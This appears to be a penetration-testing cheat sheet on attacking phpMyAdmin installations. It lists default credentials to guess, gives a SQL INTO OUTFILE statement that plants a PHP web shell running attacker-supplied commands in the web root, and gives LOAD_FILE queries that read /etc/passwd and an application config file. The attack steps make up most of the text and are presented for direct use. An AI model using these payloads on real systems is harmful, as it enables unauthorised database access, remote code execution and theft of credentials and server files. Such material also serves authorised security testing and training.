# phpMyAdmin

**What it is:** Web interface for MySQL database management. If accessible, you can read/write databases and potentially write web shells via SQL. Almost always worth trying default credentials.

**Default ports:** 80, 443 (usually at /phpmyadmin path)

**Vuln research:**
- [phpMyAdmin Security Advisories](https://www.phpmyadmin.net/security/)
- [SearchSploit: `searchsploit phpmyadmin`](https://www.exploit-db.com/search?q=phpmyadmin)
- [HackTricks — phpMyAdmin](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/phpmyadmin.html)

---


### Try default credentials

Common defaults and empty passwords — Often left misconfigured

```bash
# root: (empty)
# root:root
# root:password
# root:toor
# Check version: http://$IP/phpmyadmin/README
```

---

### Write a web shell via SQL

INTO OUTFILE to write PHP shell — Requires FILE privilege

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

---

### Read files via SQL

LOAD_FILE to read system files — Requires FILE privilege

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
```

---
